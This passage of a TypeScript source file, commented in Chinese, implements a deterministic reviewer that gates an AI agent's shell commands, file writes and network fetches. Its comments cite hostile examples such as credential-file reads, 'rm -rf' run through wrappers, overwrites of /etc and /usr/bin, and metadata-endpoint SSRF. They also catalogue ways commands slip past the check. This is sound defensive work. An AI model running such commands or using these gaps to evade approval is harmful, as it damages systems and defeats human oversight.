/**
 * Cindy Auto-Review Core —— harness 无关的确定性审查层。
 *
 * ## 为什么在这里(而非某个 agent 内)
 *
 * "Auto-review"(权限档 `auto`)先复用 harness 已验证可用的原生 reviewer；原生能力不存在或
 * 运行期失效时，再由 Cindy 用当前会话模型做轻量 fallback。各 harness 只写薄 adapter，把
 * 自己的工具调用/审批请求翻译成归一化 `ReviewableAction`，避免兼容特判散落。
 *
 * 与原生的分工(Chris 2026-07-29 定:原生优先、Cindy 兜底):harness 原生 reviewer 在已验证
 * 可用的路由上照用(如 Codex 在 OpenAI OAuth 直连的 auto_review);路由不支持/不可靠时落到
 * 本 core。Claude Code 第三方模型也走 Cindy fallback，不把原生分类器请求错误发给第三方。
 *
 * ## 两层判定
 *
 *   - **确定性绿灯 → `auto-approve`**：只读、会话内状态、工作区内文件写、明确只读 shell。
 *   - **灰区 → `prompt`**：交当前会话模型判 allow / block / ask；reviewer 故障时静默 block。
 *   - **确定性红线 → `prompt-each-time`**：凭证、提权、广泛破坏等极高风险动作才允许打扰用户。
 *
 * 这里的 `prompt` 是内部灰区标记，不等于 UI 弹窗。最终只有轻量 reviewer 明确返回 `ask`，
 * 或本地规则命中确定性红线，才弹确认；拿不准与服务不可用都回主 Agent `block`，让它换安全做法。
 *
 * ## 已知静态残口(命令字符串层不可闭合,应在 env / OS / 会话配置层缓解,不在此兜底)
 *
 * 本层只看命令字符串,以下几类的"命令本身无害、危险藏在进程环境/文件系统/仓库配置里"——静态不可判,
 * 强行兜底要么无效、要么把 auto-approve 全毁掉,故明确划为残口(与安全团队 / env 构建层的约束配合):
 *   - **PATH 解析**:白名单按 basename 判(`ls`=系统 ls)。若 PATH(或 runtimeConfig.pathPrepends /
 *     buildCodexEnv 前置目录)把用户可写目录排在 /usr/bin 前,`ls` 会跑那个目录的木马。PATH 被污染时
 *     任何命令名都不可信 —— 属"别用不可信 PATH 跑 agent"的 env 完整性问题,缓解在 env 构建层(别把
 *     不可信目录前置),不在命令审查层。显式路径(`./ls`、`/opt/homebrew/bin/ls`)已按可信目录判并升级。
 *   - **恶意 .git/config + .gitattributes**:`core.pager` / `diff.<d>.textconv` / `diff.<d>.command`(external
 *     diff)/ `core.fsmonitor` 等能让**无害 argv** 的 `git diff|show|log|blame` 跑任意程序;`remote.<n>.url=ext::`
 *     让 `git <联网子命令>` 执行(ls-remote 已因此移出白名单)。这是"在不可信 checkout 里跑 git"的仓库信任
 *     问题 —— 命令 `git diff` 本身无辜、毒在仓库配置,静态无法识别。显式传入的 `-c`/`--config-env`/`--textconv`/
 *     `--ext-diff`/`--open-files-in-pager`/`--exec-path`/`--upload-pack` 等已在 classifyGit 升级;config 文件驱动的
 *     无 argv 形态属残口,缓解在"是否信任该 checkout 的 git 配置"的会话/OS 层。
 *   - **DNS 重绑定 / 符号链接**:见 isInternalFetchTarget / isInsideWorkspace 各自注释;属网络出口过滤 / fs.realpath 层。
 */

import {
  isSensitiveCredentialPath,
  SENSITIVE_CREDENTIAL_PATH_PATTERNS,
} from './sensitive-credential-paths.js';

export { isSensitiveCredentialPath } from './sensitive-credential-paths.js';

export type ReviewVerdict = 'auto-approve' | 'prompt' | 'prompt-each-time';

/**
 * 归一化动作 —— 各 harness 的 adapter 把自己的工具调用/审批请求翻译成它,交 reviewAction 裁决。
 *   read          读文件/内省(可带 path:读凭证文件必问;scope='tree' 的目录级递归读若根在区外必升级,其余放行)
 *   session-state 会话内状态/控制,无本地写/外发(todo、后台 shell 读写、subagent 派生)
 *   file-write    带结构化路径的文件写(path 缺失=无法确认在区内→升级)
 *   exec          shell 命令(交给命令分类器)
 *   network       外发网络(URL/搜索词出境,exfil 面)
 *   other         未知/其它 → fail-closed
 */
export type ReviewableAction =
  | { kind: 'read'; path?: string; scope?: 'file' | 'tree' }
  | { kind: 'session-state' }
  | { kind: 'file-write'; path: string | undefined }
  // cwdUnknown:harness 上报了 cwd 字段但内容为空/不可解析 —— 与"未提供 cwd"(按会话工作目录)不同,
  // 必须按未知处理:相对破坏目标不可证明在区内(copidot 报 `params.cwd || workingDir` 把空串当区内)。
  | { kind: 'exec'; command: string; cwd?: string; cwdUnknown?: boolean }
  | { kind: 'network'; target?: string; operation?: string }
  | { kind: 'other'; description?: string };

/**
 * 核心裁决。纯函数、确定性、无副作用(不触文件系统 —— 探文件存在性会变侧信道,且对远端
 * 路径不可行;workspaceRoots 只做字符串前缀判定)。workspaceRoots[0] 是唯一可写工作目录，
 * 后续项是 additionalDirectories 只读引用目录，均为绝对路径。
 */
export function reviewAction(
  action: ReviewableAction,
  workspaceRoots: string[],
  opts?: { platform?: NodeJS.Platform },
): ReviewVerdict {
  // macOS firmlink(/private/{var,tmp,etc} == /{var,tmp,etc})仅在 darwin 上成立;在 Linux(含远端 Linux)
  // 上 /private/tmp 与 /tmp 是无关路径,无条件抹平会把区外写误判为区内(codex 报)→ 只在 darwin 上抹平。
  const aliasFirmlinks = (opts?.platform ?? process.platform) === 'darwin';
  switch (action.kind) {
    case 'read':
      // 读凭证/密钥文件(内置 Read/Grep 等,path 命中)必问、不可记住。
      if (action.path && isSensitiveCredentialPath(action.path)) return 'prompt-each-time';
      // 目录级递归读(Grep/Glob/LS,scope='tree')的**根目录**在工作区外 → 能遍历进区外的凭证子路径
      // (如 `Grep {path:'/Users/me', pattern:'AKIA'}` 读出 ~/.aws/credentials,而 path 本身不含凭证名,
      // copilot 报)→ 升级。读取范围含额外只读引用目录(整个 workspaceRoots)。单文件读只读一个具名文件。
      if (action.scope === 'tree' && action.path
        && !isInsideWorkspace(normalizeTarget(action.path, workspaceRoots), workspaceRoots, aliasFirmlinks)) return 'prompt';
      return 'auto-approve';
    case 'session-state':
      return 'auto-approve';
    case 'file-write': {
      if (!action.path) return 'prompt';
      // 写凭证文件必问、不可记住 —— 即便落在工作区内(如 /repo/.aws/credentials、/repo/.codex/auth.json):
      // 把 secret 写进 git-tracked checkout 与写区外同样危险,凭证性优先于工作区边界。
      if (isSensitiveCredentialPath(action.path)) return 'prompt-each-time';
      const normalizedWriteTarget = normalizeTarget(action.path, workspaceRoots);
      // **只有工作目录(workspaceRoots[0])可写**;额外目录(additionalDirectories)是只读引用上下文
      // (base-agent 契约 / index.ts extraDirs 注释:可读不可写)。相对路径挂到 workspaceRoots[0] 解析。
      // 区内一律放行 —— 即便工作区本身落在 /var、/root 等下,区内写也不该被系统红线误升(先判区内)。
      const writableRoots = workspaceRoots.slice(0, 1);
      if (isInsideWorkspace(normalizedWriteTarget, writableRoots, aliasFirmlinks)) return 'auto-approve';
      // 区外写系统/受保护目录(/etc、/System、C:\Windows 等)是高影响系统级写入,不能交灰区 reviewer
      // 静默 allow(copilot 报)→ 确定性必问。canonical(darwin 抹平 /private firmlink)后判,使
      // `/private/etc/passwd` 也命中 `/etc`。其它区外写 → 灰区 reviewer。
      if (isProtectedSystemPath(canonicalPath(normalizedWriteTarget, aliasFirmlinks))) return 'prompt-each-time';
      return 'prompt';
    }
    case 'exec': {
      const cwdUnknown = action.cwdUnknown === true || (action.cwd !== undefined && action.cwd.trim() === '');
      const shellVerdict = classifyShellCommand(action.command, workspaceRoots, {
        cwd: cwdUnknown ? undefined : action.cwd,
        cwdUnknown,
        platform: opts?.platform,
      });
      // cwd 未知 → 相对目标无法证明落在工作区内,不能按"区内"放行(至少升到灰区交 reviewer)。
      if (cwdUnknown) return shellVerdict === 'auto-approve' ? 'prompt' : shellVerdict;
      // 额外目录是只读引用，不是可执行写入边界。先保留命令分类器识别出的确定性红线，
      // 其它命令只要 cwd 不在首个可写根内就升级到 reviewer，避免相对写落进 additionalDirectories。
      const writableRoots = workspaceRoots.slice(0, 1);
      if (action.cwd
        && !isInsideWorkspace(normalizeTarget(action.cwd, workspaceRoots), writableRoots, aliasFirmlinks)) {
        return shellVerdict === 'prompt-each-time' ? shellVerdict : 'prompt';
      }
      return shellVerdict;
    }
    case 'network':
      // SSRF / 云 metadata(169.254.169.254)/ localhost / 内网抓取会把实例临时凭证或内网数据读进模型上下文,
      // 不能交灰区 reviewer 静默 allow(codex 报 WebFetch 打 metadata)→ 复用 shell 分类器同款 isInternalFetchTarget,
      // 命中即确定性必问。公网 target(及 WebSearch 的查询词)仍走灰区。
      if (action.target && isInternalFetchTarget(action.target)) return 'prompt-each-time';
      return 'prompt';
    case 'other':
    default:
      return 'prompt';
  }
}

// ─────────────────────────── shell 命令分类 ───────────────────────────

/**
 * 明确只读的 shell 命令(basename)。放行前提:命令本身不写文件/不改状态,且 argv 无输出
 * 重定向、命令替换、危险 flag。
 */
// 注意:`env`/`printenv` 不在此列 —— 裸调用会把整个进程环境(含注入子进程的 provider
// API key,见 env-builder)dump 给模型,是凭证外泄面,不能静默放行。`env VAR=x cmd` 作为
// 包裹器仍会剥壳按内层命令判定(见 COMMAND_WRAPPERS);裸 `env` 剥壳后为空段→fail-closed 升级。
// `cat`/`grep`/`base64` 等能读文件的仍在列,但读**凭证文件**由 ALWAYS_ASK_PATTERNS 先行拦成
// prompt-each-time(在 classifyShellCommand 里先于分段判定),读普通文件才放行。
const SAFE_READONLY_BINS: ReadonlySet<string> = new Set([
  'ls', 'pwd', 'echo', 'cat', 'head', 'tail', 'wc', 'stat', 'file', 'which',
  'type', 'date', 'whoami', 'hostname', 'uname', 'basename', 'dirname',
  'realpath', 'readlink', 'true', 'false', 'test', 'id', 'tty',
  'grep', 'egrep', 'fgrep', 'rg', 'ag', 'find', 'tree', 'du', 'df', 'ps',
  'diff', 'cmp', 'sort', 'uniq', 'cut', 'tr', 'column', 'nl', 'tac',
  'jq', 'yq', 'base64', 'md5', 'md5sum', 'sha256sum', 'cksum',
]);

/** 命令包裹器:剥掉后信任绑定到内层真实命令。`sudo`/`doas` 不在此列(提权本身危险)。 */
const COMMAND_WRAPPERS: ReadonlySet<string> = new Set([
  'env', 'nohup', 'nice', 'ionice', 'stdbuf', 'timeout', 'time', 'command', 'builtin',
  'setsid', 'chrt', 'exec', 'watch', 'flock', 'taskset', 'prlimit', 'setarch',
  // 命名空间/权限启动器:`unshare [opts] PROGRAM`、`nsenter [opts] PROGRAM`、`setpriv [opts] PROGRAM`
  // 都会执行后面的程序(codex 报 `unshare -- rm -rf /outside` 只落灰区)。
  'unshare', 'nsenter', 'setpriv',
  // 其余「会执行后面命令」的启动器:script(`-c '<命令串>'` 或 BSD 形态的尾随 argv,codex 报
  // `script -q -c 'rm -rf /outside' /dev/null` 只落灰区)、sg(`sg GROUP -c '<命令串>'`)、
  // unbuffer(expect 的透明包装)、busybox(applet 多路复用器)、macOS 的 arch / caffeinate。
  'script', 'sg', 'unbuffer', 'busybox', 'arch', 'caffeinate',
]);

/**
 * 凭证 / 密钥的**路径**特征。命令里出现即"触碰凭证",内置 Read 工具的 path 命中同样必问。
 * 不锚 ~/:绝对路径(/Users/x/.aws/…)、相对、~/ 三种形态都命中。
 */
// 前缀类含反斜杠 `\\`:Windows 路径(C:\Users\me\.ssh\id_rsa)的分隔符是 `\`。全部大小写不敏感(`i`):
// Windows FS 大小写不敏感,`.AWS` 等同 `.aws`;Linux 上少量混合大小写误升级也是 fail-closed 方向。
// 与 apps/desktop/src/main/filePathPolicy.ts 的 CREDENTIAL_HOME_DIRS/FILES 保持一致(codex 报的缺口)。
/**
 * 系统 / 受保护目录:写入是高影响系统级操作,不能交给灰区模型 reviewer 静默 allow(copilot 报:
 * 新语义下 `prompt` 可被 reviewer allow,写 /etc/passwd、/System/… 会绕过用户同意)。命中即确定性
 * `prompt-each-time`。与 apps/desktop/src/main/filePathPolicy.ts 的系统 blocklist 对齐(POSIX 系统目录 +
 * macOS /System·/Library + Windows %SystemRoot%/%ProgramFiles%/%ProgramData%)。判定针对已归一的绝对路径。
 */
const SYSTEM_WRITE_PATH_PATTERNS: readonly RegExp[] = [
  /^\/(?:etc|proc|sys|dev|boot|root)(?:\/|$)/i,             // POSIX 系统目录
  // 系统可执行/库目录:覆盖它们等于替换系统程序(codex 报 `cp payload /usr/bin/tool` 只落灰区)。
  // **刻意排除 `/usr/local`**:FHS 里那是 local 层级、非 OS 管理(homebrew 前缀),把它一并红线会
  // 把 `install -m 755 bin/x /usr/local/bin/x` 这类日常开发动作变成硬弹窗。
  /^\/(?:bin|sbin|lib(?:32|64|exec)?)(?:\/|$)/i,            // /bin /sbin /lib /lib64 /libexec
  /^\/usr\/(?!local(?:\/|$))(?:bin|sbin|lib(?:32|64|exec)?|share|include|libdata)(?:\/|$)/i, // /usr/* 但放行 /usr/local
  /^\/var\/(?:log|db|root)(?:\/|$)/i,                       // 系统级 /var 子目录(filePathPolicy 一致)
  /^\/(?:System|Library)(?:\/|$)/i,                         // macOS 系统目录(根级 /Library,非 ~/Library);大小写不敏感 —— 默认 HFS+/APFS 大小写不敏感,`/system`/`/library` 仍落真实系统目录(copilot 报)
  /^[A-Za-z]:[\\/](?:Windows|Program Files(?: \(x86\))?|ProgramData)(?:[\\/]|$)/i, // Windows 系统目录(带盘符)
  /^\/(?:Windows|Program Files(?: \(x86\))?|ProgramData)(?:\/|$)/i, // Windows 当前盘根相对系统路径(`\Windows\…`→`/Windows/…`,path.win32.resolve 后落 C:\Windows\…,codex 报)
];

/**
 * 抽出 shell 输出重定向(`>`/`>>`/`N>`/`&>`/`>|`)的目标文件。用于把重定向写入复用 file-write 的系统红线
 * (codex 报:`cat x > /etc/hosts` 只当灰区重定向会绕过系统写同意)。目标可带引号或裸,取到空白/分隔符止。
 */
function redirectionTargets(command: string): string[] {
  const out: string[] = [];
  const re = /(?:^|[\s;&|()])(?:\d*|&)>{1,2}\|?\s*("(?:[^"\\]|\\.)*"|'[^']*'|[^\s;&|<>()]+)/g;
  for (const m of command.matchAll(re)) {
    // shell 词拼接:相邻引号/裸片段拼成一个词(`/e'tc'/hosts` → `/etc/hosts`,codex 报)→ 去掉所有引号字符。
    // **保留反斜杠**(Windows 路径分隔符);POSIX `\` 转义形态由调用点额外查去转义变体覆盖。
    const t = m[1].replace(/['"]/g, '');
    if (t) out.push(t);
  }
  return out;
}

/**
 * 常见"以位置参数指定写入目标"的命令的目标路径 —— 与 shell 重定向同为写通道,同样要过系统路径红线
 * (codex 报:`cp payload /etc/hosts`、`install … /etc/hosts`、`… | tee /etc/hosts` 此前只当灰区)。
 *   - cp/mv/install/rsync/ln:最后一个位置参数是 DEST(≥2 个操作数时),或 `-t DIR`;
 *   - tee/sponge:所有位置参数都是写入文件;
 *   - dd `of=FILE`;
 *   - truncate / touch / mkdir / rmdir:FILE 操作数本身就是写目标;
 *   - sed/perl/ruby/awk 的 `-i` 原地编辑:FILE 操作数被改写;
 *   - tar `-C DIR`、unzip `-d DIR`、curl `-o FILE`/`--output-dir`、wget `-O FILE`/`-P DIR`:落地位置。
 * 只取静态可见的字面目标;拿不准的形态交既有其它规则,不在此强判。**注意**:这里只产出"目标",
 * 是否升级由调用点的 isProtectedSystemPath 决定 —— 所以日常写区内/临时目录不会被打断。
 */
/**
 * 写目标"静态不可证"的哨兵:目标由运行期内容决定(tar -P 的归档成员、缺失的 -t 目录),既不能证明
 * 落在系统目录、也不能证明没落 —— 消费方见到它一律要求同意。用不可能出现在真实路径里的名字。
 */
const UNPROVABLE_WRITE_TARGET = '\u0000unprovable-write-target';

/**
 * 是否是"解压"模式(会往文件系统写),而非只列出/创建归档。
 *   - tar:`-x`/`--extract`/`--get` 才解压;`-c`(创建)`-t`(列出)`-r/-u`(追加)不算写落地目录。
 *   - unzip:默认就是解压;只有 `-l`/`-t`/`-v`/`-z`(列出/校验/注释)不写文件。
 */
function isArchiveExtraction(bin: string, args: readonly string[]): boolean {
  if (bin === 'unzip') {
    return !args.some((t) => /^-[a-zA-Z]*[ltvz]$/.test(t) && !t.startsWith('--'));
  }
  const oldStyle = tarOldStyleOptionWord(args);
  return (oldStyle?.includes('x') ?? false)
    || args.some((t) => t === '--extract' || t === '--get' || /^-[a-zA-Z]*x/.test(t));
}

/**
 * tar 的**传统无横线选项词**(首个参数,如 `tar xCf /etc payload.tar` 里的 `xCf`)。GNU/BSD tar 都接受
 * 这种历史写法,且带值字母**按出现顺序依次取后面的操作数**(与 getopt 簇的"附着值"语义不同:
 * `xCf /etc p.tar` → C=/etc、f=p.tar)。只有首个参数按此解析(codex 报:原先只认 `-` 开头的 token,
 * 既判不出解压模式也取不到写目标)。
 */
function tarOldStyleOptionWord(args: readonly string[]): string | null {
  const first = args[0];
  if (!first || !/^[A-Za-z]+$/.test(first)) return null;
  // 传统选项词必须含一个功能字母(x/c/t/r/u/A/d),否则 `tar dist` 这类把目录名当选项词会误判。
  return /[xctruAd]/.test(first) ? first : null;
}

/** tar 传统选项词里带值字母按顺序绑定后续操作数;返回 `letter` 绑定到的值。 */
function tarOldStyleValues(
  optionWord: string,
  operands: readonly string[],
  valueLetters: string,
  letter: string,
): string[] {
  const out: string[] = [];
  let oi = 0;
  for (const ch of optionWord) {
    if (!valueLetters.includes(ch)) continue;
    const value = operands[oi];
    oi += 1;
    if (ch === letter && value) out.push(value);
  }
  return out;
}

/**
 * 解析短选项簇里的**带值选项**(getopt 语义)。簇内第一个带值字母之后的字符就是它的值
 * (`curl -so/etc/hosts` → `o` 的值是 `/etc/hosts`);若该字母在簇尾,值是下一个 argv
 * (`tar -xC /etc` → `C` 的值是 `/etc`)。字母后的字符会被当成值吃掉,所以一簇最多解出一个带值选项
 * —— 与真实 getopt 一致(`tar -Cf DIR FILE` 里 `C` 的值就是字面 `f`,DIR/FILE 是操作数)。
 * `valueLetters` 必须是该命令**全部**带值短选项字母(大小写敏感),否则 `curl -do out URL` 会把
 * `-d` 的值误当成输出文件。
 */
function shortClusterOption(
  token: string,
  next: string | undefined,
  valueLetters: string,
): { letter: string; value?: string; consumedNext: boolean } | null {
  if (!/^-[A-Za-z]/.test(token)) return null; // 排除 `--long`、裸 `-` 与非字母簇
  const cluster = token.slice(1);
  for (let k = 0; k < cluster.length; k++) {
    const ch = cluster[k];
    if (!valueLetters.includes(ch)) continue;
    const attached = cluster.slice(k + 1);
    return attached.length > 0
      ? { letter: ch, value: attached, consumedNext: false }
      : { letter: ch, value: next, consumedNext: true };
  }
  return null;
}

function argumentWriteTargets(tokens: string[]): string[] {
  const bin = executableName(tokens[0] ?? '');
  const args = tokens.slice(1);
  const operands = positionalOperands(args);
  if (bin === 'tee' || bin === 'sponge') return operands;
  if (bin === 'cp' || bin === 'mv' || bin === 'install' || bin === 'rsync' || bin === 'ln') {
    // `install -d/--directory DIR...`:第四种用法只创建目录,**全部操作数都是写目标**、且可能只有一个
    // (codex 报 `install -d /etc/cron.d` 因"至少两个操作数"的规则而取不到目标)。
    // `-d` 可出现在短选项簇里(`install -dm755 /etc/x` = -d + -m 755),不能只匹配末位。
    // 大小写敏感:`-D`(--create-leading-dirs)仍是"复制文件"语义,末位操作数才是目标,不能误入本分支。
    if (bin === 'install' && args.some((t) => t === '--directory' || /^-[a-zA-Z]*d/.test(t))) {
      return operands;
    }
    // `-t DIR` / `--target-directory=DIR`:目标目录由选项给出,**不是**末位操作数
    // (codex 报 `cp -t /etc payload` 会把 payload 当目标、长选项形态则完全取不到目标)。
    // 只对 coreutils 的 cp/mv/install/ln 生效:**rsync 的 `-t` 是 --times**(保留时间戳,不带值),
    // 按目标目录解会把 `rsync -avt /etc/conf/ backup/` 的**读源**当成写目标而误拦。
    if (bin !== 'rsync') {
      const valueLetters = bin === 'install' ? 'tSmog' : 'tS';
      for (let i = 0; i < args.length; i++) {
        const t = args[i];
        if (t === '--target-directory') {
          const dir = args[i + 1];
          return dir ? [dir] : [UNPROVABLE_WRITE_TARGET]; // 缺目标 = 静态不可证 → 哨兵,必问
        }
        const attached = /^--target-directory=(.+)$/.exec(t);
        if (attached) return [attached[1]];
        // 短选项:`-t /etc`、`-t/etc`、簇内 `-ft /etc`(codex 报的簇语义)。
        const cluster = shortClusterOption(t, args[i + 1], valueLetters);
        if (!cluster) continue;
        if (cluster.consumedNext) i++;
        if (cluster.letter !== 't') continue;
        return cluster.value ? [cluster.value] : [UNPROVABLE_WRITE_TARGET];
      }
    }
    // mv 的**源**操作数同样被销毁(搬走系统文件等于删掉它,`mv /usr/bin/node /tmp/`)→ 源与目标
    // 都算写目标;cp/install/ln/rsync 的源是只读的,不在此列(自审补的同族缺口)。
    if (bin === 'mv') return operands;
    return operands.length >= 2 ? [operands[operands.length - 1]] : [];
  }
  // 删除本身就是写通道:`rm /etc/passwd`(无 -rf)只删单个文件,不进递归/强制路径,原先取不到目标、
  // 只落灰区(codex 报)。所有删除目标都要过受保护系统路径判定;**区外批量破坏**仍由
  // destructiveRmTargets 的递归/强制条件负责,故此处不改变 `rm -rf build` 这类区内删除的档位。
  if (/^(?:rm|unlink|shred|srm)$/.test(bin)) {
    const out: string[] = [];
    let optionsEnded = false;
    for (let i = 0; i < args.length; i++) {
      const t = args[i];
      if (!optionsEnded) {
        if (t === '--') { optionsEnded = true; continue; }
        // shred 的带值选项(-n 次数 / -s 字节 / --random-source=FILE)不能当成删除目标。
        if (bin === 'shred' && /^(?:-n|--iterations|-s|--size|--random-source)$/.test(t)) { i++; continue; }
        if (t.startsWith('-') && t !== '-') continue;
      }
      out.push(t);
    }
    return out;
  }
  if (bin === 'del' || bin === 'erase') {
    // cmd.exe 的开关形如 `/f` `/s` `/q` `/a:-h`;Windows 路径不会以单个 `/` + 字母起头。
    return args.filter((t) => !/^\/[a-zA-Z](?::|$)/.test(t));
  }
  if (bin === 'dd') {
    return tokens.slice(1).flatMap((t) => {
      const m = /^of=(.+)$/i.exec(t);
      return m ? [m[1]] : [];
    });
  }
  // 直接以 FILE 操作数为写目标:truncate(-s 改大小,可清空)、touch(创建/改 mtime)、
  // mkdir/rmdir(在系统目录下建删目录)。codex 报 `truncate -s 0 /etc/passwd`;此处把同类
  // 写通道一并纳入,不逐条等报。带值选项先消费,避免把选项值当目标。
  if (bin === 'truncate') {
    const out: string[] = [];
    for (let i = 0; i < args.length; i++) {
      const t = args[i];
      if (t === '-s' || t === '--size' || t === '-r' || t === '--reference') { i++; continue; }
      if (t.startsWith('-')) continue;
      out.push(t);
    }
    return out;
  }
  if (bin === 'touch' || bin === 'mkdir' || bin === 'rmdir') {
    const out: string[] = [];
    for (let i = 0; i < args.length; i++) {
      const t = args[i];
      // touch -r REF / -d DATE / -t STAMP;mkdir -m MODE 都带独立值。
      if (/^(?:-r|--reference|-d|--date|-t|-m|--mode)$/.test(t)) { i++; continue; }
      if (t.startsWith('-')) continue;
      out.push(t);
    }
    return out;
  }
  // 原地编辑:`sed -i`、`perl -i`(含 -pi/-i.bak)、`ruby -i` 直接改写 FILE 操作数。
  if (bin === 'sed' || bin === 'perl' || bin === 'ruby' || /^(?:gawk|awk)$/.test(bin)) {
    const inPlace = args.some((t) => /^-{1,2}i/.test(t) || /^-[a-zA-Z]*i/.test(t));
    if (!inPlace) return [];
    const out: string[] = [];
    for (let i = 0; i < args.length; i++) {
      const t = args[i];
      // sed -e SCRIPT / -f FILE、perl -e CODE 的值不是写目标。
      if (/^(?:-e|--expression|-f|--file)$/.test(t)) { i++; continue; }
      if (t.startsWith('-')) continue;
      out.push(t);
    }
    // sed 的第一个非选项操作数可能是 script(`sed -i 's/a/b/' f`),多取一个目标只会更保守。
    return out;
  }
  // 解压/下载的**落地目录或文件**:tar -C DIR、unzip -d DIR、curl -o FILE / --output-dir DIR、
  // wget -O FILE / -P DIR —— 都能把内容写进系统目录。
  if (bin === 'tar' || bin === 'unzip' || bin === 'curl' || bin === 'wget') {
    const out: string[] = [];
    // tar -P/--absolute-names:不剥成员路径的前导 `/`,归档里若含 `/etc/cron.d/job` 会直接写进系统路径。
    // 归档内容静态不可见 → 无法证明成员安全,用哨兵 `/` 强制必问(codex 报)。
    const tarOldStyle = bin === 'tar' ? tarOldStyleOptionWord(args) : null;
    if (bin === 'tar' && (args.some((t) => t === '--absolute-names' || /^-[A-Za-z]*P/.test(t))
      || (tarOldStyle?.includes('P') ?? false))) {
      return [UNPROVABLE_WRITE_TARGET];
    }
    // 长选项(含 `=` 附加值)按整 token 匹配;短选项一律走**簇语义** —— 原先只认以 `-C`/`-o`/`-O`
    // 开头的 token,漏掉合法且常见的 `tar -xC /etc -f p.tar`、`unzip -oqd /etc p.zip`、
    // `curl -so/etc/hosts URL`、`wget -qO/etc/hosts URL`(codex 报,实机探针确认真会落盘)。
    const never = /(?!)/; // unzip 的落地目录只有短选项 -d,没有长选项形态
    const longFlags = bin === 'tar' ? /^--directory$/
      : bin === 'unzip' ? never
        : bin === 'curl' ? /^(?:--output|--output-dir)$/
          : /^(?:--output-document|--directory-prefix)$/;
    const longAttached = bin === 'tar' ? /^--directory=(.+)$/
      : bin === 'unzip' ? never
        : bin === 'curl' ? /^(?:--output=|--output-dir=)(.+)$/
          : /^(?:--output-document=|--directory-prefix=)(.+)$/;
    // 写目标字母 + 该命令全部带值短选项字母(后者用于定位簇内第一个带值选项,见 shortClusterOption)。
    // wget 的 `-o LOGFILE` 也落盘(日志文件),同属写通道。
    const targetLetters = bin === 'tar' ? 'C' : bin === 'unzip' ? 'd' : bin === 'curl' ? 'o' : 'OPo';
    const valueLetters = bin === 'tar' ? 'CfTXbIKNLVgF'
      : bin === 'unzip' ? 'dOPx'
        : bin === 'curl' ? 'odFHuAebcCDEKTUwxyYzmMQ'
          : 'OPoitTwQARDeUBI';
    // tar 的传统无横线选项词:带值字母按顺序吃后面的操作数(`tar xCf /etc payload.tar` → C=/etc)。
    if (tarOldStyle) {
      out.push(...tarOldStyleValues(tarOldStyle, positionalOperands(args.slice(1)), valueLetters, 'C'));
    }
    for (let i = 0; i < args.length; i++) {
      const t = args[i];
      if (longFlags.test(t)) { const v = args[i + 1]; if (v) out.push(v); i++; continue; }
      const m = longAttached.exec(t);
      if (m) { out.push(m[1]); continue; }
      const cluster = shortClusterOption(t, args[i + 1], valueLetters);
      if (!cluster) continue;
      if (cluster.consumedNext) i++;
      if (targetLetters.includes(cluster.letter) && cluster.value) out.push(cluster.value);
    }
    // 下载工具**不带落地选项**时按远端文件名写进当前目录(`curl -O URL`、`wget URL`),cwd 落系统目录
    // 即写系统文件(与解压落 cwd 同类)。curl 默认写 stdout,只有 -O/--remote-name 系才落盘。
    if (out.length === 0) {
      const curlWritesCwd = bin === 'curl'
        && args.some((t) => /^--remote-name(?:-all)?$/.test(t)
          || (/^-[A-Za-z]/.test(t) && !t.startsWith('--') && t.slice(1).includes('O')));
      const wgetWritesCwd = bin === 'wget'
        && !args.some((t) => /^--output-document(?:=|$)/.test(t));
      if (curlWritesCwd || wgetWritesCwd) return ['.'];
    }
    // 解压**不带落地目录选项**时写入当前目录:归档成员的相对路径(如 `hosts`)会落在有效 cwd 下,
    // cwd=/etc 时即覆盖 /etc/hosts(codex 报;unzip 同缺口)。用 `.` 表示"当前目录",由调用方按
    // 有效 cwd 解析 —— 区内解压照常留灰区,cwd 落系统目录才升红线。
    if (out.length === 0 && (bin === 'tar' || bin === 'unzip') && isArchiveExtraction(bin, args)) {
      return ['.'];
    }
    return out;
  }
  // 权限/属主/属性变更:改的是**访问控制**,与改内容同等危险(`chmod 000 /etc/passwd` 直接破坏系统
  // 可用性、`chown me /etc/passwd` 把系统文件交给当前用户)。既有红线只覆盖 chmod 777 / 全局开放写
  // 这一类"放宽"形态,收紧与换属主都没覆盖(codex 报)→ 把 FILE 操作数当写目标,复用系统路径判定。
  if (/^(?:chmod|chown|chgrp|chflags|chattr|setfacl)$/.test(bin)) {
    const out: string[] = [];
    // 首个操作数是 MODE/OWNER/GROUP/FLAGS 规格而非文件;`--reference=RFILE`(chmod/chown)从参考文件
    // 取规格,此时**没有**规格操作数,全部操作数都是目标。chattr 的属性词以 `+`/`-`/`=` 起头,已被
    // 选项过滤跳过,故不占规格位。
    const specFromReference = args.some((t) => /^--reference(?:=|$)/.test(t));
    // 需要"规格操作数"的命令:chmod 的 MODE、chown 的 OWNER[:GROUP]、chgrp 的 GROUP、chflags 的 FLAGS、
    // chattr 的属性词。setfacl 的 ACL 由 -m/-x 等选项给出,`--reference` 从参考文件取规格 → 无规格操作数,
    // 此时全部操作数都是目标。
    let needsSpec = bin !== 'setfacl' && !specFromReference;
    let optionsEnded = false;
    for (let i = 0; i < args.length; i++) {
      const t = args[i];
      if (!optionsEnded) {
        if (t === '--') { optionsEnded = true; continue; }
        // 带独立值的选项:chmod/chown `--reference RFILE`、chown `--from OLD`、setfacl `-m/-x/-M/-X ACL`。
        if (/^(?:--reference|--from)$/.test(t)) { i++; continue; }
        if (bin === 'setfacl' && /^(?:-m|-x|-M|-X|--modify|--remove|--set|--restore)$/.test(t)) { i++; continue; }
        // chmod 的符号模式与 chattr 的属性词可以 `-`/`+`/`=` 起头(`chmod -w f`、`chmod +x f`、`chattr +i f`),
        // 当成选项跳过会把后面的**真实目标**误当规格操作数吃掉 → 先正面识别规格词。
        // 大小写敏感:`-R`(递归)不落进 `-[rwxXstugo]+`,仍按选项跳过。
        const isSpecWord = needsSpec && (
          (bin === 'chmod' && /^(?:[0-7]{1,4}|[-+=][rwxXstugo]+|[ugoa]*[-+=][rwxXstugo]*)$/.test(t))
          || (bin === 'chattr' && /^[-+=][a-zA-Z]+$/.test(t)));
        if (isSpecWord) { needsSpec = false; continue; }
        if (t.startsWith('-')) continue;
      }
      if (needsSpec) { needsSpec = false; continue; } // 位置型规格(chown/chgrp/chflags 的首个操作数)
      out.push(t);
    }
    return out;
  }
  return [];
}

/**
 * 标准伪设备:写它们不是"系统写入",而是丢弃输出/写终端/取随机数,属日常最高频写法
 * (`cmd > /dev/null`、`2>/dev/null`、`>/dev/null 2>&1`)。必须排除在系统红线外,否则 Auto 档会对
